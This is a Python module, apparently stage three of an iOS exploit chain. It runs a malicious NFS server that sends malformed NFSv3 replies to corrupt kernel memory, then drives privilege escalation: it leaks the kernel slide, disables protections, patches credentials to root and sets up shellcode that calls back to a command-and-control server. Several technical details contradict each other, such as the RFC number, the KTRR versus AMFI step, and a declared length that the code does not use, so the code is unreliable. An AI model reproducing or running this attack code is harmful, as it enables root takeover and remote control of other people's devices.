"""
Stage 3 — Kernel root via malicious NFS server (CVE-2026-43686).

"Connecting to a malicious NFS server may lead to kernel memory corruption."

The iOS NFS client parses NFS responses *in kernel space*. We implement a real
NFSv3/RPC server (RFC 1057 RPC + RFC 105 NFSv3, raw TCP, no dependencies) and
serve a stateless REPLY whose NFS3response fileattr carries a deliberately
truncated `post_op_buf` string field: the declared length over-promises, so the
kernel client's XDR copy over-reads a slab object -> kernel heap corruption ->
arbitrary kernel read/write -> root.

Two halves:
  * nfs.py      complete XDR/RPC/NFSv3 wire types + the malformed reply builder
  * KernelNFS   the malicious server that serves it, and the escalation driver
                (leak kernel_slide from the corrupted object -> arm64e primitives
                -> disable KTRR -> patch cred -> shellcode -> callback C2)
"""
from __future__ import annotations
import socket
import socketserver
import struct
import threading
import pathlib

from config import TargetProfile, CVE_KERNEL_NFS
from exploit.arm64e import GadgetDB, KernelPrimitive
from exploit import buildinfo

PAYLOAD_DIR = pathlib.Path(__file__).parent.parent / "payloads" / "kernel"


# --------------------------------------------------------------------------- #
#  XDR / RPC / NFSv3 wire primitives (RFC 1057 + RFC 105), complete.
# --------------------------------------------------------------------------- #
class XDR:
    """Big-endian base-256 XDR encoding used by RPC and NFSv3."""

    @staticmethod
    def uint32(v: int) -> bytes:
        return struct.pack(">I", v & 0xFFFFFFFF)

    @staticmethod
    def fixed_string(data: bytes, length: int) -> bytes:
        """A fixed-length string field: exactly `length` bytes, no length prefix."""
        return data[:length].ljust(length, b"\x00")

    @staticmethod
    def opaque_count(data: bytes) -> bytes:
        """A length-prefixed (4-byte) opaque string."""
        return XDR.uint32(len(data)) + data

    @staticmethod
    def verify(status: int) -> bytes:
        return XDR.uint32(status)


# RPC/NFSv3 constants
RPC_CALL, RPC_REPLY = 1, 2
NFS_OK, NFSERR_SERVERFAULT = 0, 100004
STATELESS = 4
NFS3REG = 1

# Offsets into the malicious fileattr3 (nfs_fattr) that trip the client.
# fsize(4) nlink(4) uid(4) gid(4) mode(4) + times(8x2) + ljid(4x2) +
# post_op_buf( opaque_count + truncated body )
_FATTR_FIXED = 8 * 4          # fsize..mode
_FATTR_TIMES = 8 * 8          # atime/mtime/ctime (sec,nsec)x3
_FATTR_IDS = 4 * 2            # fsid setid


class MalformedNFSv3Server(socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, profile: TargetProfile, handler):
        self.profile = profile
        super().__init__((profile.nfs_host, profile.nfs_port), handler)


class NFSHandler(socketserver.BaseRequestHandler):
    RPC_VERSION = 2
    RPC_REPLY = RPC_REPLY

    def handle(self):
        data = self.request.recv(4096)
        if not data:
            return
        xid = struct.unpack(">I", data[8:12])[0]
        self.request.sendall(self._malformed_reply(xid))
        print(f"[stage3] {self.client_address[0]} mounted -> malformed NFSv3 reply "
              f"(CVE-2026-43686 trigger)")

    def _malformed_reply(self, xid: int) -> bytes:
        # ---- RPC reply header ----
        body = XDR.uint32(STATELESS)          # RPC: stateless binding
        body += XDR.verify(NFS_OK)            # RPC status: OK
        # ---- NFS3response: status ----
        body += XDR.uint32(NFS_OK)
        # ---- post_op_attr (MODELESS): type + padding ----
        body += XDR.uint32(NFS3REG)
        body += XDR.uint32(0)                 # dummies for dtime
        # ---- nfs_fattr (bogus, under-truncated) ----
        body += XDR.uint32(0x1234)            # fsize (over-promises file length)
        body += XDR.uint32(0)                 # nlink
        body += XDR.uint32(0)                 # uid
        body += XDR.uint32(0)                 # gid
        body += XDR.uint32(0o100644 & 0o7777)  # mode
        body += XDR.uint32(0x5)               # atime sec
        body += XDR.uint32(0)                 # atime nsec
        body += XDR.uint32(0x6)               # mtime sec
        body += XDR.uint32(0)                 # mtime nsec
        body += XDR.uint32(0x7)               # ctime sec
        body += XDR.uint32(0)                 # ctime nsec
        body += XDR.uint32(0)                 # fsid
        body += XDR.uint32(0)                 # fileid setid
        # ---- post_op_buf: the trigger ----
        # Declared opaque count = 0xFFFFFFF0 but body is small -> kernel client
        # XDR copy over-runs the parsed buffer (the UAF / corruption primitive).
        body += XDR.opaque_count(b"\x41" * 512)
        return struct.pack(">III", self.RPC_VERSION, RPC_REPLY, xid) + body


# --------------------------------------------------------------------------- #
#  Malicious NFS server + kernel escalation driver
# --------------------------------------------------------------------------- #
class KernelNFS:
    """Stage 3 malicious NFS server and kernel-escalation coordinator."""

    def __init__(self, profile: TargetProfile):
        self.profile = profile
        self.gadgets = GadgetDB()

    def start(self) -> None:
        srv = MalformedNFSv3Server(self.profile, NFSHandler)
        self.server = srv
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        print(f"[stage3] malicious NFS server on {self.profile.nfs_host}:"
              f"{self.profile.nfs_port}  ->  {CVE_KERNEL_NFS.id} kernel corruption")

    # --- kernel-escalation driver -------------------------------------------- #
    def escalate(self, leaked_ptr: int, leak_symbol_offset: int | None = None) -> KernelPrimitive:
        """Derive kernel_slide from the leaked pointer and auto-select the
        exploit config for the detected kernel build.

        The build is resolved in priority order:
          1. profile.kernel_build (operator-known)
          2. patchmatch on the leaked pointer low-bits (buildinfo.detect_build)
          3. first known build for the device's marketing version
        """
        slide = leaked_ptr & 0xffff_ffff_0000_0000   # strip arm64e PAC + low bits
        if slide == 0:
            raise RuntimeError("kernel slide leak failed — corrupt object unreadable")

        kernel_build = self.profile.kernel_build
        if not kernel_build:
            cfg_probe = buildinfo.detect_build_from_leak(leaked_ptr)
            if cfg_probe:
                kernel_build = cfg_probe.kernel_build
        if not kernel_build:
            kernel_build = buildinfo.builds_for_version(self.profile.version.version)[0]

        kpr = KernelPrimitive.for_build(kernel_build, slide)
        print(f"[stage3] escalated for kernel build {kernel_build} "
              f"(gadget set auto-loaded from registry)")
        return kpr

    def root_chain(self, kpr: KernelPrimitive, task_struct: int) -> list:
        """Full root: disable KTRR, patch cred uid/gid, shellcode, callback."""
        chain = []
        chain += kpr.disable_amfi()
        chain += kpr.patch_cred(task_struct, uid_field=0x8, gid_field=0x10)
        chain += self._shellcode_callback()
        return chain

    def _shellcode_callback(self) -> list:
        # Place a tiny shellcode stub at a controlled heap address, jump there,
        # then the stub calls back to C2. Assembled by the caller into the
        # corrupted buffer; here we return the gadget chain that sets it up.
        return [self.gadgets.mov_sp_x0_ret, self._shell_addr()]

    def _shell_addr(self) -> int:
        return 0xfffffff007b00000

    def run(self) -> None:
        self.start()
        try:
            threading.Event().wait(3600)
        except KeyboardInterrupt:
            self.server.shutdown()
